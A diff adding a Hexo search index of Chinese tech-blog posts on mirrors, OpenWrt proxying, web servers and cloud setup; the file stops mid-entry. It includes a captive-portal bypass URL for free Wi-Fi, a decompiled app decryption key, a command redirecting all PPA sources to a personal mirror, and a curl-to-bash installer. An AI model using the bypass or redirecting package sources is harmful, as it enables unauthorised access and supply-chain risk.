@@ -1,0 +1,825 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[Ubuntu ppa 私有仓库加速]]></title>
+    <url>%2Fblog%2F2018%2F05%2F17%2Fubuntu-ppa-mirror%2F</url>
+    <content type="text"><![CDATA[ubuntu 一键切换到 ppa 加速1sudo sed -i &quot;s/ppa\.launchpad\.net/lanuchpad.moruy.cn/g&quot; /etc/apt/sources.list.d/*.list]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>Linux</tag>
+        <tag>镜像</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[rabbitmq 镜像服务]]></title>
+    <url>%2Fblog%2F2018%2F05%2F17%2Frabbitmq-mirror%2F</url>
+    <content type="text"><![CDATA[使用说明使用 curl 然后用 -L 参数防止重定向，另外也可以 wget 12345678910# 原链接https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.5/rabbitmq-server-3.7.5-1.el6.noarch.rpm# 替换后curl -L http://bintray.moruy.cn/rabbitmq/all/rabbitmq-server/3.7.5/rabbitmq-server-3.7.5-1.el6.noarch.rpm -orabbitmq-server-3.7.5-1.el6.noarch.rpm# wget wget --max-redirect=0 http://bintray.moruy.cn/rabbitmq/all/rabbitmq-server/3.7.5/rabbitmq-server-3.7.5-1.el6.noarch.rpm -orabbitmq-server-3.7.5-1.el6.noarch.rpm]]></content>
+      <categories>
+        <category>架构</category>
+        <category>消息队列</category>
+      </categories>
+      <tags>
+        <tag>tls</tag>
+        <tag>镜像</tag>
+        <tag>mirror</tag>
+        <tag>bintray</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[docker 容器添加 tap 支持]]></title>
+    <url>%2Fblog%2F2018%2F05%2F16%2Fdocker-create-tap-device%2F</url>
+    <content type="text"><![CDATA[docker 容器默认不支持 tap 设备，通过下面的方式就可以添加了： 123sudo mkdir -p /dev/netsudo mknod /dev/net/tun c 10 200sudo chmod 600 /dev/net/tun]]></content>
+      <categories>
+        <category>虚拟化</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>虚拟化</tag>
+        <tag>azure</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[谷歌云计算 GCP 体验]]></title>
+    <url>%2Fblog%2F2018%2F05%2F16%2Fgcp%2F</url>
+    <content type="text"><![CDATA[今天测试了一下谷歌的云服务，绑定信用卡送 $300 刀，这个活动记得很久就开始了，最近 GCP 进行了比较大的更新，马上就开始测试一下吧！ 管理面板 GAE – Google app engine 迁移到这里了 云服务器 云主机通过 web ssh 管理 小结： 使用任意的云服务都提供向导指向标创建云服务 ssh 可以通过 web ssh 和 gcp 客户端管理 亚洲的机房主要是台湾，延迟还比较低 另外左下角的控制台非常好用，值得学习 参考资料 Google Compute Engine Documentation]]></content>
+      <categories>
+        <category>云服务</category>
+        <category>GCP</category>
+      </categories>
+      <tags>
+        <tag>Google</tag>
+        <tag>云计算</tag>
+        <tag>GCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[openwrt Wi-fi 优化]]></title>
+    <url>%2Fblog%2F2018%2F04%2F06%2Fopenwrt-wifi-tuning%2F</url>
+    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243#/etc/config/wirelessconfig wifi-device &apos;radio0&apos; option type &apos;mac80211&apos; option channel &apos;11&apos; option hwmode &apos;11g&apos; option path &apos;pci0000:00/0000:00:01.0/0000:02:00.0&apos; # txpower 是传输功率，越大信号越强 option txpower &apos;16&apos; option noscan &apos;1&apos; option country &apos;US&apos; option legacy_rates &apos;1&apos; option enable &apos;1&apos; option disabled &apos;0&apos; # 开启 40hz option htmode &apos;HT40&apos;config wifi-iface &apos;default_radio0&apos; option device &apos;radio0&apos; option network &apos;lan&apos; option mode &apos;ap&apos; option ssid &apos;Netgear-01&apos; option key &apos;**********&apos; option encryption &apos;psk2&apos;config wifi-device &apos;radio1&apos; option type &apos;mac80211&apos; option channel &apos;36&apos; option hwmode &apos;11a&apos; option path &apos;pci0000:00/0000:00:00.0/0000:01:00.0&apos; option htmode &apos;VHT80&apos; option noscan &apos;1&apos; option txpower &apos;12&apos; option country &apos;US&apos; option legacy_rates &apos;1&apos; option enable &apos;1&apos;config wifi-iface &apos;default_radio1&apos; option device &apos;radio1&apos; option network &apos;lan&apos; option mode &apos;ap&apos; option ssid &apos;Netgear-02&apos; option encryption &apos;psk2&apos; option key &apos;**********&apos;]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>路由器固件</category>
+        <category>openwrt/lede</category>
+      </categories>
+      <tags>
+        <tag>wifi</tag>
+        <tag>openwrt</tag>
+        <tag>lede</tag>
+        <tag>Wi-Fi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[openwrt 配置 ss + redsocks 实现智能 tcp 转发]]></title>
+    <url>%2Fblog%2F2018%2F04%2F06%2Fopenwrt-ss-redsocks%2F</url>
+    <content type="text"><![CDATA[配置软件源 在 系统 &gt; 软件包 &gt; OPKG 配置，然后修改软件源： 1234567# 发行版软件源src/gz reboot_core http://mirrors.ustc.edu.cn/lede/snapshots/targets/ramips/mt7621/packagessrc/gz reboot_base http://mirrors.ustc.edu.cn/lede/snapshots/packages/mipsel_24kc/basesrc/gz reboot_luci http://mirrors.ustc.edu.cn/lede/snapshots/packages/mipsel_24kc/lucisrc/gz reboot_packages http://mirrors.ustc.edu.cn/lede/snapshots/packages/mipsel_24kc/packagessrc/gz reboot_routing http://mirrors.ustc.edu.cn/lede/snapshots/packages/mipsel_24kc/routingsrc/gz reboot_telephony http://mirrors.ustc.edu.cn/lede/snapshots/packages/mipsel_24kc/telephony 123# 自定义软件源包含（ss、chinadns、dns转发）src/gz openwrt_dist http://openwrt-dist.sourceforge.net/packages/LEDE/base/mipsel_24kcsrc/gz openwrt_dist_luci http://openwrt-dist.sourceforge.net/packages/LEDE/luci 安装软件包 123456789opkg updateopkg install ChinaDNSopkg install luci-app-chinadnsopkg install dns-forwarderopkg install luci-app-dns-forwarderopkg install shadowsocks-libevopkg install luci-app-shadowsocksopkg install luci-app-shadowvpnopkg install redsocks 配置 ss + redsocks 123456789101112131415161718192021222324# /etc/redsocks.confbase &#123;log_debug = off;log_info = off;daemon = on;redirector= iptables;&#125;redsocks &#123;local_ip = 192.168.1.1;local_port = 31338; ip = 192.168.11.1;# SS 端口port = 1080;type = socks5;&#125;redudp &#123; local_ip = 192.168.1.1; local_port = 31339; ip = 192.168.11.1; port = 1080; udp_timeout = 4;&#125; 开启 iptbales 重定向 tcp 实现全局代理 1234567891011121314iptables -t nat -N REDSOCKS# bypassiptables -t nat -A REDSOCKS -d 0.0.0.0/8 -j RETURNiptables -t nat -A REDSOCKS -d 10.0.0.0/8 -j RETURNiptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURNiptables -t nat -A REDSOCKS -d 169.254.0.0/16 -j RETURNiptables -t nat -A REDSOCKS -d 172.16.0.0/12 -j RETURNiptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURNiptables -t nat -A REDSOCKS -d 224.0.0.0/4 -j RETURNiptables -t nat -A REDSOCKS -d 240.0.0.0/4 -j RETURN# 192.168.1.101 的 tcp 请求转发到 redsocks 31338iptables -t nat -A REDSOCKS -s 192.168.1.101/31 -p tcp -j REDIRECT --to-ports 31338# 开启 tcp 转发iptables -t nat -A PREROUTING -p tcp -j REDSOCKS]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>路由器固件</category>
+        <category>openwrt/lede</category>
+      </categories>
+      <tags>
+        <tag>openwrt</tag>
+        <tag>ss</tag>
+        <tag>redsocks</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[caddy web 服务器]]></title>
+    <url>%2Fblog%2F2018%2F03%2F31%2Fcaddy-web-server%2F</url>
+    <content type="text"><![CDATA[最近研究了一个性能比较强悍的 web 服务器，golang 写的。 官网地址：https://caddyserver.com/ 安装： 1curl https://getcaddy.com | bash -s personal http.authz,http.cache,http.geoip,http.minify,http.ratelimit,http.realip,http.webdav 基本配置（caddyfile）： 单个网站 1# caddyfile 开机自启（caddy.service）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[Unit]Description=Caddy HTTP/2 web serverDocumentation=https://caddyserver.com/docsAfter=network-online.targetWants=network-online.target systemd-networkd-wait-online.service[Service]Restart=on-abnormal; User and group the process will run as.User=www-dataGroup=www-data; Letsencrypt-issued certificates will be written to this directory.Environment=CADDYPATH=/etc/ssl/caddy; Always set &quot;-root&quot; to something safe in case it gets forgotten in the Caddyfile.ExecStart=/usr/local/bin/caddy -log stdout -agree=true -conf=/etc/caddy/Caddyfile -root=/var/tmpExecReload=/bin/kill -USR1 $MAINPID; Use graceful shutdown with a reasonable timeoutKillMode=mixedKillSignal=SIGQUITTimeoutStopSec=5s; Limit the number of file descriptors; see `man systemd.exec` for more limit settings.LimitNOFILE=1048576; Unmodified caddy is not expected to use more than that.LimitNPROC=512; Use private /tmp and /var/tmp, which are discarded after caddy stops.PrivateTmp=true; Use a minimal /dev (May bring additional security if switched to &apos;true&apos;, but it may not work on Raspberry Pi&apos;s or other devices, so it has been disabled in this dist.)PrivateDevices=false; Hide /home, /root, and /run/user. Nobody will steal your SSH-keys.ProtectHome=true; Make /usr, /boot, /etc and possibly some more folders read-only.ProtectSystem=full; … except /etc/ssl/caddy, because we want Letsencrypt-certificates there.; This merely retains r/w access rights, it does not add any new. Must still be writable on the host!ReadWriteDirectories=/etc/ssl/caddy; The following additional security directives only work with systemd v229 or later.; They further restrict privileges that can be gained by caddy. Uncomment if you like.; Note that you may have to add capabilities required by any plugins in use.;CapabilityBoundingSet=CAP_NET_BIND_SERVICE;AmbientCapabilities=CAP_NET_BIND_SERVICE;NoNewPrivileges=true[Install]WantedBy=multi-user.target]]></content>
+      <categories>
+        <category>架构</category>
+        <category>web 服务器</category>
+      </categories>
+      <tags>
+        <tag>caddy</tag>
+        <tag>web 服务器</tag>
+        <tag>https</tag>
+        <tag>tls</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[IPA 文件下载]]></title>
+    <url>%2Fblog%2F2018%2F03%2F31%2FIPA-file-download%2F</url>
+    <content type="text"><![CDATA[最近一个项目需要下载 IPA 文件进行测试，然后就分享一下这个下载过程吧。 首先打开 iTunes 然后 iTunes 搜索 然后点击 get，IPA 文件就会下载下来 windows 下载后文件保存在：C:\Users\UserName\Music\iTunes\iTunes Media\Mobile Applications macOS 下载后保存在：~/Music/iTunes/Mobile Applications/]]></content>
+      <categories>
+        <category>移动开发</category>
+        <category>iOS</category>
+      </categories>
+      <tags>
+        <tag>iOS</tag>
+        <tag>移动设备</tag>
+        <tag>IPA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[openssl 加密文件]]></title>
+    <url>%2Fblog%2F2018%2F03%2F25%2Fopenssl-encrypt-file%2F</url>
+    <content type="text"><![CDATA[准备 openssl 命令行 假定待加密的文件名为 plaintext.txt 对称加密 1234# 加密文件openssl aes-256-cbc -salt -a -e -in plaintext.txt -out encrypted.txt# 解密文件openssl aes-256-cbc -salt -a -d -in encrypted.txt -out plaintext.txt 非对称加密 1234567# 创建公钥openssl genrsa -aes256 -out private.key 8912openssl rsa -in private.key -pubout -out public.key# 加密openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt# 解密openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>openssl</tag>
+        <tag>加密</tag>
+        <tag>解密</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[电信客户端安全分析]]></title>
+    <url>%2Fblog%2F2018%2F03%2F24%2Fctclinet-security-test%2F</url>
+    <content type="text"><![CDATA[工具准备 mitmproxy 代理服务器 安卓或 iOS 设置代理，安装 SSL 证书 IDA 基本流程 以安卓客户端为例，脱壳，启动 APP，然后 dump dex 文件 找到加密算法逻辑，然后记录 研究成果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public String getTimeStamp() &#123; return (new SimpleDateFormat(&quot;yyyyMMddHHmmss&quot;).format(new Date())); &#125; # 解密算法 public String decrypt(byte[] message) throws Exception &#123; final byte[] digestOfPassword = TripleDESTest.m4430d(&quot;1234567`90koiuyhgtfrdewsaqaqsqde&quot;); final SecretKey key = new SecretKeySpec(digestOfPassword, &quot;DESede&quot;); final Cipher decipher = Cipher.getInstance(&quot;DESede/CBC/PKCS5Padding&quot;); int blockSize = decipher.getBlockSize(); byte[] bArr = new byte[blockSize]; for (int i = 0; i &lt; blockSize; i++) &#123; bArr[i] = (byte) 0; &#125; decipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(bArr)); // final byte[] encData = new // sun.misc.BASE64Decoder().decodeBuffer(message); final byte[] plainText = decipher.doFinal(message); return new String(plainText, &quot;UTF-8&quot;); &#125; public static byte[] m4427a(String str) throws IOException &#123; int i = 0; int length = str.length() / 2; byte[] bArr = new byte[length]; if (str.length() % 2 != 0) &#123; throw new IOException(&quot;hexadecimal string with odd number of characters&quot;); &#125; int i2 = 0; while (i &lt; length) &#123; int i3 = i2 + 1; i2 = &quot;0123456789abcdef0123456789ABCDEF&quot;.indexOf(str.charAt(i2)); if (i2 == -1) &#123; throw new IOException(&quot;hexadecimal string contains non hex character&quot;); &#125; int i4 = (i2 &amp; 15) &lt;&lt; 4; i2 = i3 + 1; bArr[i] = (byte) ((&quot;0123456789abcdef0123456789ABCDEF&quot;.indexOf(str.charAt(i3)) &amp; 15) + i4); i++; &#125; return bArr; &#125; private static byte[] m4430d(String str) throws Exception &#123; byte[] obj = new byte[24]; byte[] bytes = str.getBytes(&quot;UTF-8&quot;); if (obj.length &gt; bytes.length) &#123; System.arraycopy(bytes, 0, obj, 0, bytes.length); &#125; else &#123; System.arraycopy(bytes, 0, obj, 0, obj.length); &#125; return obj; &#125; 总结 该客户端几乎收集所有手机系统信息，包括 IMEI、运营商、手机型号、MAC 地址、WIFI 名称等等 全程加密发送，DESede/CBC/PKCS5Padding 模式加密，数据安全性还行。]]></content>
+      <categories>
+        <category>安全研究</category>
+      </categories>
+      <tags>
+        <tag>抓包</tag>
+        <tag>mitmproxy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux 大文件分割]]></title>
+    <url>%2Fblog%2F2018%2F03%2F24%2Flinux-split-large-file%2F</url>
+    <content type="text"><![CDATA[方式一：split + cat123# split 命令参考split [-a suffix_length] [-b byte_count[k|m]] [-l line_count] [-p pattern] [file [name]] 12345678# 把 foo 文件分割成 500M 块split --bytes 500M --numeric-suffixes --suffix-length=3 foo foo.# 把 foo 文件分割成 100k 块split -b 100k -d -a 3 foo foo.# 合并块文件cat foo.* &gt; foo_2# 合并方式 2find -maxdepth 1 -type f -name &apos;foo.*&apos; | sort | xargs cat &gt; foo_3 方式二：gzip + cat + split12gzip &lt; dump.bson | split -b 32M - dump.bson.gz.cat dump.bson.gz.* | gunzip &gt; dump.bson]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>干货分享</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>大文件</tag>
+        <tag>split</tag>
+        <tag>cat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[AWS EC2 分配 ipv6]]></title>
+    <url>%2Fblog%2F2018%2F03%2F17%2FAWS-assign-ipv6%2F</url>
+    <content type="text"><![CDATA[最近中国电信宽带分配了 IP v6 地址，测试了一下效果还行，而 AWS 服务器也是可以开 IP v6 的，找了一几个文章参考，然后就配置好了，配置还算简单。 简单来说主要就是这么几个步骤： 设置 VPC 的 CIDR 设置 subnet 给 EC2 分配 IP v6 地址 更新 ec2 系统配置 设置路由表 设置 VPC 的 CIDR 设置 subnet 给 EC2 分配 IP v6 地址 更新 ec2 系统配置 可参考 “参考文档 1” 参考文档 Migrating to IPv6 设置路由表 [Route Tables] 里面选择路由表，然后在 [Routes] 里面添加一条 [::/0] 即可解决。]]></content>
+      <categories>
+        <category>云服务</category>
+        <category>AWS</category>
+      </categories>
+      <tags>
+        <tag>IP v6</tag>
+        <tag>ipv6</tag>
+        <tag>AWS</tag>
+        <tag>Ubuntu</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[wiair 免费共享 Wi-Fi 破解]]></title>
+    <url>%2Fblog%2F2018%2F03%2F07%2Fwiair-crack%2F</url>
+    <content type="text"><![CDATA[最近老家附近安装了非常多的共享 Wi-Fi，都需要关注公众号才能共享上网，根据其机理可以推测，调用微信的 Wi-Fi 共享接口，获取回调，然后放行设备，流控管理应该是基于用户 MAC 地址绑定的。连接共享 Wi-Fi 后打开这样的页面。 我们可以看到地址栏地址为： http://wifi.wiair.com/?tid=17226deda1fd&amp;rid=3cd9a858088a&amp;gw=192.168.16.1&amp;did=1557671&amp;sn=BLINK_WR316?tid=17226deda1fd&amp;rid=3cd9a858088a&amp;gw=192.168.16.1&amp;did=1557671&amp;sn=BLINK_WR316 其中参数有 gw、did,这两个参数可以猜测为网关地址和设备 id，这个两个参数应该是非常重要的参数。打开页面的源代码我们可以看到这样一个函数，设备放行： 123456789101112131415// 设备放行&lt;iframe id=&quot;ajaxIframe&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; var allowRun = function(fn)&#123; fn=fn||function()&#123;&#125;; var IP = GetQueryString(&quot;gw&quot;), MAC = GetQueryString(&quot;tid&quot;), url = &quot;http://&quot;+IP+&quot;/protocol.csp?fname=net&amp;opt=plug_cgi&amp;function=set&amp;path=/tmp/ipc_path_share&amp;id=0&amp;tid=&quot;+MAC; if(IP&amp;&amp;MAC)&#123; ajaxIframe = document.getElementById(&apos;ajaxIframe&apos;); ajaxIframe.setAttribute(&apos;src&apos;, url); ajaxIframe.onload = function()&#123;fn()&#125;; &#125;else &#123; fn(); &#125;&#125; 然后我们可以根据对应参数拼上这个链接： http://192.168.16.1/protocol.csp?fname=ug_cgi&amp;function=set&amp;path=/tmp/ipc_path_share&amp;id=0&amp;tid=17226deda1fd 就可以手动放行设备，不需要关注公众号上网了。 上面这种验证方式做的很简单，估计也是出于性能考虑，并没有做其他的校验就可以免费上网。]]></content>
+      <categories>
+        <category>安全研究</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>破解</tag>
+        <tag>wifi</tag>
+        <tag>wiair</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux hyper-v 性能优化]]></title>
+    <url>%2Fblog%2F2018%2F03%2F06%2FLinux-hyper-v-performance%2F</url>
+    <content type="text"><![CDATA[使用了差不多一年多的 微软 azure 云服务，今天手动重装了系统，由于是 hyper-v 虚拟化的，我们需要做一定的优化才能使得原版系统获得更好的性能，具体的数据暂时没有采集，只观察到性能确实提高了不少。主要就是安装了 Hyper-V Linux Integration Services，简称 HLS，另外切换 clocksource 为 tsc。由于使用的是 debian 系列，其他发行版的安装教程请自行斟酌。 debian/ubuntu 安装 Hyper-V Linux Integration Services 12345678910apt-get install hyperv-daemonsecho &quot;&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;# Hyper-V Modules&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_vmbus&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_storvsc&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_blkvsc&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_netvsc&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_balloon&quot; &gt;&gt; /etc/initramfs-tools/modulesecho &quot;hv_utils&quot; &gt;&gt; /etc/initramfs-tools/modulesupdate-initramfs -u &amp;&amp; reboot clocksource 切换 tsc 1234567891011121314151617181920sudo apt-get install sysfsutils# ---------------------------------# Manage /sys filesystem. Requires sysfsutils package## Turn off THPsudo tee -a /etc/sysfs.d/thp.conf &lt;&lt;-EOF kernel/mm/transparent_hugepage/enabled = neverkernel/mm/transparent_hugepage/khugepaged/defrag = 0kernel/mm/transparent_hugepage/defrag = neverEOF## Set clocksource to tsc to speed everything up https://www.youtube.com/watch?v=agQMFIWr2h4sudo tee -a /etc/sysfs.d/clocksource.conf &lt;&lt;-EOF devices/system/clocksource/clocksource0/current_clocksource = tscEOF# ---------------------------------sudo systemctl enable sysfsutils.servicesudo systemctl start sysfsutils.service 其他系统暂时没有测试, 可以根据参考里面的链接下载 HLS 自行安装， 参考资料： Linux Integration Services v4.2 for Hyper-V and Azure http://kb.rkidder.com clocksource to tsc]]></content>
+      <categories>
+        <category>虚拟化</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>虚拟化</tag>
+        <tag>hyper-v</tag>
+        <tag>azure</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[腾讯云活动最经济的撸法]]></title>
+    <url>%2Fblog%2F2018%2F03%2F06%2Ftencent-cloud-cheapest-way%2F</url>
+    <content type="text"><![CDATA[最近腾讯云推出一个学生专用套餐 10/月，配置是 1 vCore、2G 内存、40g 硬盘，包年 120，其实非学生用户也是可以申请的，学生资料可以随便乱填。最经济的撸法可以这样描述： 机房的选择，最便宜的当属成都机房 代理商，通过第三方代理商渠道我们可以包年 84元 购买和续费。 服务器降配，补偿使用使用时间。 腾讯云为何要这样做这样的营销活动呢？ 时机，大学生刚返校，过年回去多少有点闲钱。 群体特殊性，通过组团传播的形式，最大化扩展消息，可以扩展到班级、学院、QQ 群，朋友圈子等等。 价格优势，原价 50 多每月变成 10 每月，折扣率大。 外部竞争压力，阿里云目前占据公有云市场 48%。另外国际上有 AWS 这种巨头。 另外就是产品线的问题，腾讯云目前打通了和微信以及第三方代码托管平台的连接。另外就是促进了域名的需求。 0307 总结，腾讯云这次确实是非常成功的一次营销，互联网圈子都被腾讯云的优惠消息引爆，到今天还有余温。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>干货分享</category>
+      </categories>
+      <tags>
+        <tag>云服务</tag>
+        <tag>腾讯云</tag>
+        <tag>经济</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[ATS 高速反向代理服务器]]></title>
+    <url>%2Fblog%2F2018%2F02%2F25%2Fapache-traffic-server%2F</url>
+    <content type="text"><![CDATA[简介ATS 是一个高性能的 web 反向代理软件，类似于 squid proxy 和 Varnish 的高性能反代软件。 安装教程我这里里的测试服务器是 AWS 的 lightsail $10 一个月的 vps，服务器系统是 Ubuntu 16.04: 12# 安装sudo apt-get install trafficserver 配置默认配置文件是 /etc/trafficserver/records.config， 开启反代模式 records.config 12345CONFIG proxy.config.http.cache.http INT 1CONFIG proxy.config.reverse_proxy.enabled INT 1CONFIG proxy.config.url_remap.remap_required INT 1CONFIG proxy.config.url_remap.pristine_host_hdr INT 1CONFIG proxy.config.http.server_ports STRING 8080 8080:ipv6 设置代理内容 remap.config 反代 localhost 的 80 端口 regex_map http://(.*)/ http://localhost:80/ 调整缓存内容 12# 默认为 256MB/cache/trafficserver 10G 启动代理服务器 12345sudo mkdir -p /var/run/trafficserversudo mkdir -p /var/log/trafficserversudo chmod 766 -R /var/log/trafficserversudo chmod 766 -R /var/log/trafficservertraffic_server start 日志和监控参考资料 https://docs.trafficserver.apache.org/en/latest/index.html Replacing Squid with ATS ATS cache ATS siege]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络加速</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Google</tag>
+        <tag>alpine</tag>
+        <tag>ATS</tag>
+        <tag>反代</tag>
+        <tag>reverse proxy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[2017 网站迁移 github]]></title>
+    <url>%2Fblog%2F2017%2F12%2F06%2F2017-new-site%2F</url>
+    <content type="text"><![CDATA[最近把网站迁移到了 github，很早以前使用的博客系统是 Wordpress，发现 wordpress 反应速度还是稍微慢了一点，性能感觉也不是很好，估计和使用的主机商所在的国家有一定的关系，另外就是主机商的限制，做了很多优化都没太大效果，后面又在 openshift 搭建了基于 nodejs 的 ghost 博客系统，使用 cloudflare 加速，加速效果感觉还不错。当然了，使用 cloudflare 要获取很快的节点是有技巧的，前面有所介绍过。后面买了 do 的 vps，搭建了基于 nginx + php7 + mangodb 的博客，do 的磁盘性能非常不错，比套路云要好很多很多，然后用朋友的身份代备案了一下网站，备案很顺利，用的阿里云那种免费主机。 新网站使用的是 github pages 服务，配合 cloudflare 加速访问，另外选择的是 hexo + next 静态网站生成，目前 cloudflare 启用了新的出口节点，速度很给力，希望不要翻车就好了。]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网站更新</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+        <tag>网站迁移</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[AWS 命令行客户端]]></title>
+    <url>%2Fblog%2F2017%2F06%2F20%2FAWS-cli%2F</url>
+    <content type="text"><![CDATA[AWS cli 支持命令行操作大部分的云服务，然后可以利用它进行一些脚本化操作。今天学习了一下它的教程，然后就记录一下吧！ 前期准备 创建 Security credentials 记录 Access key ID 和 Secret access key 12345# 环境：ubuntu 16.04# 安装 awsclipip install awscli --upgrade --user# 配置，这里需要【前期准备 2 的 ID 和 key】aws configure 开始使用，以操作 ec2 为例 12345678910111213# 寻找 ec2 可用区域aws ec2 describe-regions --output table# 创建安全组aws ec2 create-security-group --group-name devenv-sg --description &quot;security group for development environment in EC2&quot;# 配置端口出入aws ec2 authorize-security-group-ingress --group-name devenv-sg --protocol tcp --port 22 --cidr 0.0.0.0/0# 创建 ssh keyaws ec2 create-key-pair --key-name devenv-key --query &apos;KeyMaterial&apos; --output text &gt; devenv-key.pem# 启动 ec2aws ec2 run-instances --image-id ami-6e1a0117 --security-group-ids sg-b018ced5 --count 1 --instance-type t2.micro --key-name devenv-key --query &apos;Instances[0].InstanceId&apos;# ssh 连接 ec2chmod 400 devenv-key.pemssh -i &quot;devenv-key.pem&quot; ServerUserName@ServerIP 参考资料 What Is the AWS Command Line Interface?]]></content>
+      <categories>
+        <category>云服务</category>
+        <category>AWS</category>
+      </categories>
+      <tags>
+        <tag>AWS</tag>
+        <tag>python</tag>
+        <tag>macOS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[微软虚拟机镜像]]></title>
+    <url>%2Fblog%2F2017%2F04%2F16%2Fmicrosoft-virtual-image%2F</url>
+    <content type="text"><![CDATA[XP 以后版本 https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ VMWARE https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/VirtualBox/IE6/Windows/IE6.XP.For.Windows.VirtualBox.zip https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/VirtualBox/IE6/Windows/IE8.XP.For.Windows.VirtualBox.zip VBOX https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/VMware/IE6/Windows/IE6.XP.For.Windows.VMware.ziphttps://az412801.vo.msecnd.net/vhd/VMBuild_20141027/VMware/IE8/Windows/IE8.XP.For.Windows.VMware.zip HYPER-V https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/HyperV_2008R2/IE6/Windows/IE6.XP.For.Windows.HyperV_2008R2.zip https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/HyperV_2008R2/IE8/Windows/IE8.XP.For.Windows.HyperV_2008R2.zip Parallels for Mac版本 https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/Parallels/IE6/Mac/IE6.XP.For.Mac.Parallels.zip https://az412801.vo.msecnd.net/vhd/VMBuild_20141027/Parallels/IE8/Mac/IE8.XP.For.Mac.Parallels.zip]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>虚拟机镜像</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kexec 快速更换内核]]></title>
+    <url>%2Fblog%2F2017%2F02%2F10%2FKexec-change-kernel%2F</url>
+    <content type="text"><![CDATA[Kexec 主要用于系统的内核切换，不需要完全重新启动系统，一般可以通过安装 kexec-tools 这个包进行安装，然后配合 kexec-reboot 可以用在生产环境。基本安装步骤： 12345sudo apt-get install kexec-toolswget https://raw.githubusercontent.com/vadmium/kexec-reboot/master/kexec-rebootchmod +x kexec-rebootsudo mv kexec-reboot /usr/local/sbin/kexec-rebootsudo /usr/local/sbin/kexec-reboot 安装内核包： 123apt-cache search linux-image # 安装 3.19.0-58 内核apt-get install linux-image-3.19.0-58-generic linux-image-extra-3.19.0-58 配置 kexec 1234# 查看安装的内核然后选择切换kexec-reboot -i# 另外可用通过下面的命令自动快速切换内核kexec-reboot -l -r 参考资料 Kexec kexec-reboot]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>内核</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[在 vps 挂载谷歌云盘]]></title>
+    <url>%2Fblog%2F2016%2F11%2F21%2Fmount-google-drive-in-vps%2F</url>
